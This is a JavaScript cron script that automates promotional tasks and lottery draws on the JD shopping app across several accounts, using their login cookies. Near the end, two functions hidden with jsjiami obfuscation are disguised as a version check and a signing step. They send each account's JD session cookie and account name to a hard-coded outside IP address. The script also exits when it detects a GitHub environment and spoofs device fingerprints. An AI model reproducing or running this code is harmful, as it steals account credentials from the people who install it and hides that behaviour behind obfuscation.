/*
入口：[京东App]
36 5,10,14,17,21 * * * Sami_jd_hw0yl.js
============Sami===============
*/

const $ = new Env("Sami好物0元领")
const Ver = '20220626';
const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
let cookiesArr = [], cookie = '',UserName1='',data1='';
!(async () => {
    await $.wait(1000);
    await VerCheck("hw0yl",Ver);
    await $.wait(1000);
    requireConfig()
    
    for (let i = 0; i < cookiesArr.length; i++) {
        cookie = cookiesArr[i]
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        UserName1 =encodeURIComponent($.UserName)
        
        console.log(`\n账号【${$.index}】${$.UserName} 开始任务******`);
        //加购并浏览商品
        data = await getSign()
        if (data.code === 100){
            await doTask1()
            await $.wait(5000);
            await doTask2()
            await $.wait(5000);
            await doTask3()
            await $.wait(5000);
            await doTask4()
            await $.wait(5000); 
        }
        
    }
    
})()  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function doTask1(){
    let hasFinish = false;
    let itemName = '';
    for (let i = 0; i < 25; i++) {
        data = await getMyTask()
        //console.log(JSON.stringify(data))
        for (let vo of  data.data?.myTasks) {
            let taskId =vo.taskId;
            if (taskId === 323){
                hasFinish=vo.hasFinish;
                itemName=vo.taskItem?.itemName;
                let itemId =vo.taskItem?.itemId;
                if (hasFinish === true){
                    //console.log(itemName + ` 已经完成！！！`);
                    //break;
                }else{
                    let itemCount=vo.itemCount;
                    let finishCount=vo.finishCount;
                    console.log(itemName + ` 共`+itemCount+`个任务,已完成`+finishCount+`个`);
                    finishCount=finishCount +1;
                    console.log(`开始执行第`+finishCount+`个任务7S`);
                    data = await GetWxJsApiSign(itemId);
                    //console.log(data);
                    await $.wait(7000);
                    data = await doTask(taskId,'4','undefined','undefined','&itemId='+itemId);
                    //console.log(data);
                    console.log(`任务执行完成`);
                    //await $.wait(60000);
                }
                
                
            }
            
            
        }
        if (hasFinish === true){
            console.log(itemName + ` 已经完成！！！`);
            break;
        }
        
    }
}

async function doTask2(){
    let hasFinish = false;
    let itemName = '';
    for (let i = 0; i < 5; i++) {
        data = await getMyTask()
        //console.log(JSON.stringify(data))
        for (let vo of  data.data?.myTasks) {
            let taskId =vo.taskId;
            if (taskId === 256){
                hasFinish=vo.hasFinish;
                itemName=vo.taskItem?.itemName;
                let itemId =vo.taskItem?.itemId;
                if (hasFinish === true){
                    //console.log(itemName + ` 已经完成！！！`);
                    //break;
                }else{
                    let itemCount=vo.itemCount;
                    let finishCount=vo.finishCount;
                    console.log(itemName + ` 共`+itemCount+`个任务,已完成`+finishCount+`个`);
                    finishCount=finishCount +1;
                    console.log(`开始执行第`+finishCount+`个任务15S`);
                    data = await GetApiSign(itemId);
                    //console.log(data);
                    await $.wait(15000);
                    data = await doTask(taskId,'3','B5AM5PNJCOUO6HURL4N24BXQ67YWSPUK7IK355ZCDMNYO35SW5HYTFU7CKJMC7SBEWP2MVZIOFZFGTWI2HEMGD7GVY','efad23698e5d7fc89daf064e7e11e1d9','');
                    //console.log(data);
                    console.log(`任务执行完成`);
                    //await $.wait(60000);
                }
                
                
            }
            
            
        }
        if (hasFinish === true){
            console.log(itemName + ` 已经完成！！！`);
            break;
        }
        
    }
}

async function doTask3(){
    let hasFinish = false;
    let itemName = '';
    for (let i = 0; i < 6; i++) {
        data = await getMyTask()
        //console.log(JSON.stringify(data))
        for (let vo of  data.data?.myTasks) {
            let taskId =vo.taskId;
            if (taskId === 281){
                hasFinish=vo.hasFinish;
                itemName=vo.taskItem?.itemName;
                let itemId =vo.taskItem?.itemId;
                if (hasFinish === true){
                    //console.log(itemName + ` 已经完成！！！`);
                    //break;
                }else{
                    let itemCount=vo.itemCount;
                    let finishCount=vo.finishCount;
                    console.log(itemName + ` 共`+itemCount+`个任务,已完成`+finishCount+`个`);
                    finishCount=finishCount +1;
                    console.log(`开始执行第`+finishCount+`个任务15S`);
                    data = await GetShopApiSign(itemId);
                    //console.log(data);
                    await $.wait(15000);
                    data = await doTask(taskId,'2','B5AM5PNJCOUO6HURL4N24BXQ67YWSPUK7IK355ZCDMNYO35SW5HYTFU7CKJMC7SBEWP2MVZIOFZFGTWI2HEMGD7GVY','efad23698e5d7fc89daf064e7e11e1d9','&itemId='+itemId);
                    //console.log(data);
                    console.log(`任务执行完成`);
                    //await $.wait(60000);
                }
                
                
            }
            
            
        }
        if (hasFinish === true){
            console.log(itemName + ` 已经完成！！！`);
            break;
        }
        
    }
}

async function doTask4(){
    for (let i = 0; i < 10; i++) {
        data = await getMyRewards()
        if(parseInt(data.data?.totalPoints / 10)>0 ){
            data = await draw()
            console.log('抽奖结果：'+data.data?.rewardName)
        }else{
            console.log("抽奖结束,剩余抽奖码："+ data.data?.totalPoints +"个")
            break;
        }
        
    }
}

function doTask(taskId,taskType,eid,fp,itemId) {
    return new Promise(resolve => {
        $.post({
            url: 'https://jdjoy.jd.com/module/freshgoods/doTask',               
            headers: {
                "Cookie": cookie,
                "Host":"jdjoy.jd.com",
                "origin": "https://pro.m.jd.com",
                "referer": "https://pro.m.jd.com/",
                'Content-Type': 'application/x-www-form-urlencoded',
                "User-Agent": ua,
            },
            body:'code=96fcfd5b64d0480b84019c5549ead367&taskType='+taskType+'&taskId='+taskId+'&eid='+eid+'&fp='+fp+itemId
        }, (_, resp, data) => {
            try {
                if(data){
                    data = JSON.parse(data)
                }
                
            } catch (e) {
                $.logErr('Error: ', e, resp)
            } finally {
                resolve(data)
            }
        })
    })
}  

function getMyTask(){
     return new Promise(resolve => {
        $.get({
            url:`https://jdjoy.jd.com/module/freshgoods/getMyTask?code=96fcfd5b64d0480b84019c5549ead367`,
            headers: {
                "Cookie": cookie,
                "User-Agent": ua
            },
        }, (_, resp, data) => {
            try {
                data = JSON.parse(data)
            } catch (e) {
                $.logErr('Error: ', e)
            } finally {
                resolve(data)
            }
        })
    })
}

function GetWxJsApiSign(itemId){
     return new Promise(resolve => {
        $.get({
            url:`https://wq.jd.com/bases/jssdk/GetWxJsApiSign?url=https%3A%2F%2Fitem.m.jd.com%2Fproduct%2F`+ itemId +`.html%3F%26cookie%3D%257B%2522wxapp_type%2522%253A1%257D&callback=getwxjssign2&t=0.605298557357373&sceneval=2`,
            headers: {
                "Cookie": cookie,
                "Host": "wq.jd.com",
                "Referer": "https://item.m.jd.com/",
                "User-Agent": ua
            }
        }, (_, resp, data) => {
            try {
                data = JSON.parse(data)
            } catch (e) {
                //$.logErr('Error: ', e)
            } finally {
                resolve(data)
            }
        })
    })
}

function GetApiSign(itemId){
     return new Promise(resolve => {
        $.get({
            url:`https://pro.m.jd.com/mini/active/`+itemId+`/index.html?cookie=%7B%22visitkey%22%3A%2203022918026031641092820541%22%2C%22__wga%22%3A%221656235683144.1656232238177.1656225705126.1641092820919.62.77%22%2C%22PPRD_P%22%3A%22EA.17078.49.1-LOGID.1656235683165.1835270047-CT.138567.20.0%22%2C%22__jda%22%3A%22122270672.8e1b5739d00df0c65e1c69fb5aa5efe0.1656122080159.1656122080159.1656122080159.1%22%2C%22__jdv%22%3A%22122270672%7Cdirect%7Ct_1000578828_xcx_1089_ltkxl%7Cxcx%7C-%7C1656235683912%22%2C%22unpl%22%3A%22%22%2C%22wxapp_type%22%3A1%2C%22cd_eid%22%3A%22%22%2C%22pinStatus%22%3A0%2C%22wxapp_openid%22%3A%22oA1P50A_FNLtWheZkel6U2lc9B80%22%2C%22wxapp_version%22%3A%227.18.230%22%2C%22buildtime%22%3A20220623%2C%22md5_pin%22%3A%22554abe53794c86f904d0b0f68b64c668%22%2C%22degrade_level%22%3A0%7D&wxAppName=jd`,
            headers: {
                "Cookie": cookie,
                "Host": "pro.m.jd.com",
                //"Referer": "https://item.m.jd.com/",
                "User-Agent": ua
            }
        }, (_, resp, data) => {
            try {
                data = JSON.parse(data)
            } catch (e) {
                //$.logErr('Error: ', e)
            } finally {
                resolve(data)
            }
        })
    })
}

function GetShopApiSign(itemId){
     return new Promise(resolve => {
        $.get({
            url:`https://shop.m.jd.com/?shopId=`+itemId+`&cookie=%7B%22visitkey%22%3A%2203022918026031641092820541%22%2C%22__wga%22%3A%221656237382282.1656232238177.1656225705126.1641092820919.82.77%22%2C%22PPRD_P%22%3A%22EA.17078.49.1-LOGID.1656237382291.290513434-CT.138567.20.0%22%2C%22__jda%22%3A%22122270672.8e1b5739d00df0c65e1c69fb5aa5efe0.1656122080159.1656122080159.1656122080159.1%22%2C%22__jdv%22%3A%22122270672%7Cdirect%7Ct_1000578828_xcx_1089_ltkxl%7Cxcx%7C-%7C1656237383672%22%2C%22unpl%22%3A%22%22%2C%22wxapp_type%22%3A1%2C%22cd_eid%22%3A%22%22%2C%22pinStatus%22%3A0%2C%22wxapp_openid%22%3A%22oA1P50A_FNLtWheZkel6U2lc9B80%22%2C%22wxapp_version%22%3A%227.18.230%22%2C%22buildtime%22%3A20220623%2C%22md5_pin%22%3A%22554abe53794c86f904d0b0f68b64c668%22%2C%22degrade_level%22%3A0%7D`,
            headers: {
                "Cookie": cookie,
                "Host": "shop.m.jd.com",
                //"Referer": "https://item.m.jd.com/",
                "User-Agent": ua
            }
        }, (_, resp, data) => {
            try {
                data = JSON.parse(data)
            } catch (e) {
                //$.logErr('Error: ', e)
            } finally {
                resolve(data)
            }
        })
    })
}

function draw(){
     return new Promise(resolve => {
        $.get({
            url:`https://jdjoy.jd.com/module/freshgoods/draw?code=96fcfd5b64d0480b84019c5549ead367&eid=B5AM5PNJCOUO6HURL4N24BXQ67YWSPUK7IK355ZCDMNYO35SW5HYTFU7CKJMC7SBEWP2MVZIOFZFGTWI2HEMGD7GVY&fp=efad23698e5d7fc89daf064e7e11e1d9`,
            headers: {
                "Cookie": cookie,
                "Host": "jdjoy.jd.com",
                //"Referer": "https://item.m.jd.com/",
                "User-Agent": ua
            }
        }, (_, resp, data) => {
            try {
                data = JSON.parse(data)
            } catch (e) {
                //$.logErr('Error: ', e)
            } finally {
                resolve(data)
            }
        })
    })
}


function getMyRewards(){
     return new Promise(resolve => {
        $.get({
            url:`https://jdjoy.jd.com/module/freshgoods/getMyRewards?code=96fcfd5b64d0480b84019c5549ead367`,
            headers: {
                "Cookie": cookie,
                "Host": "jdjoy.jd.com",
                //"Referer": "https://item.m.jd.com/",
                "User-Agent": ua
            }
        }, (_, resp, data) => {
            try {
                data = JSON.parse(data)
            } catch (e) {
                //$.logErr('Error: ', e)
            } finally {
                resolve(data)
            }
        })
    })
}

function requireConfig() {
    return new Promise(resolve => {
        notify = $.isNode() ? require('./sendNotify') : '';
        const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
        if ($.isNode()) {
            Object.keys(jdCookieNode).forEach((item) => {
                if (jdCookieNode[item]) {
                    cookiesArr.push(jdCookieNode[item])
                }
            })
            if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
        } else {
            cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
        }
        console.log(`共${cookiesArr.length}个京东账号\n`)
        //resolve()
    })
}

function gettimestamp() {
  let time = new Date().getTime();
  return `${time}`;
}

function random(min, max) {
  let num = Math.floor(Math.random() * (max - min)) + min;
  return `${num}`;
}

function randomString(e) {
    e = e || 32;
    let t = "abcdefhijkmnprstwxyz2345678",
        a = t.length,
        n = "";
    for (i = 0; i < e; i++)
        n += t.charAt(Math.floor(Math.random() * a));
    return n
}


function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb86=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x56\x65\x72\x43\x68\x65\x63\x6B\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x76\x65\x72\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u7248\u672C\u4FE1\u606F\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x6C\x6F\x67","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x20\x20\u6700\u65B0\u7248\u672C\x3A","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5EFA\u8BAE\u62C9\u53D6\u811A\u672C\u83B7\u53D6\u65B0\u7248\u672C","\x20\x20\u6700\u65B0\u7248\u672C\x3A\u83B7\u53D6\u5931\u8D25\x21","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function VerCheck(_0x89aax2,_0x89aax3){return  new Promise((_0x89aax4)=>{$[__Oxdcb86[0x10]]({url:`${__Oxdcb86[0x0]}${_0x89aax2}${__Oxdcb86[0x1]}${_0x89aax3}${__Oxdcb86[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x89aax5,_0x89aax6,_0x89aax7)=>{try{_0x89aax7= JSON[__Oxdcb86[0x3]](_0x89aax7);if(_0x89aax7[__Oxdcb86[0x4]]=== 100){if(_0x89aax3=== _0x89aax7[__Oxdcb86[0x5]]){console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0x8]+ Ver);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xb]+ _0x89aax7[__Oxdcb86[0x5]]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xd]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}catch(e){$[__Oxdcb86[0xf]](__Oxdcb86[0xe],e)}finally{_0x89aax4(_0x89aax7)}})})}(function(_0x89aax8,_0x89aax9,_0x89aaxa,_0x89aaxb,_0x89aaxc,_0x89aaxd){_0x89aaxd= __Oxdcb86[0x11];_0x89aaxb= function(_0x89aaxe){if( typeof alert!== _0x89aaxd){alert(_0x89aaxe)};if( typeof console!== _0x89aaxd){console[__Oxdcb86[0x7]](_0x89aaxe)}};_0x89aaxa= function(_0x89aaxf,_0x89aax8){return _0x89aaxf+ _0x89aax8};_0x89aaxc= _0x89aaxa(__Oxdcb86[0x12],_0x89aaxa(_0x89aaxa(__Oxdcb86[0x13],__Oxdcb86[0x14]),__Oxdcb86[0x15]));try{_0x89aax8= __encode;if(!( typeof _0x89aax8!== _0x89aaxd&& _0x89aax8=== _0x89aaxa(__Oxdcb86[0x16],__Oxdcb86[0x17]))){_0x89aaxb(_0x89aaxc)}}catch(e){_0x89aaxb(_0x89aaxc)}})({})

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe4284=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x68\x77\x30\x79\x6C","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getSign(){return  new Promise((_0xc755x2)=>{$[__Oxe4284[0x4]]({url:`${__Oxe4284[0x0]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":UserName1,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0xc755x3,_0xc755x4,_0xc755x5)=>{try{_0xc755x5= JSON[__Oxe4284[0x1]](_0xc755x5)}catch(e){$[__Oxe4284[0x3]](__Oxe4284[0x2],e)}finally{_0xc755x2(_0xc755x5)}})})}(function(_0xc755x6,_0xc755x7,_0xc755x8,_0xc755x9,_0xc755xa,_0xc755xb){_0xc755xb= __Oxe4284[0x5];_0xc755x9= function(_0xc755xc){if( typeof alert!== _0xc755xb){alert(_0xc755xc)};if( typeof console!== _0xc755xb){console[__Oxe4284[0x6]](_0xc755xc)}};_0xc755x8= function(_0xc755xd,_0xc755x6){return _0xc755xd+ _0xc755x6};_0xc755xa= _0xc755x8(__Oxe4284[0x7],_0xc755x8(_0xc755x8(__Oxe4284[0x8],__Oxe4284[0x9]),__Oxe4284[0xa]));try{_0xc755x6= __encode;if(!( typeof _0xc755x6!== _0xc755xb&& _0xc755x6=== _0xc755x8(__Oxe4284[0xb],__Oxe4284[0xc]))){_0xc755x9(_0xc755xa)}}catch(e){_0xc755x9(_0xc755xa)}})({})
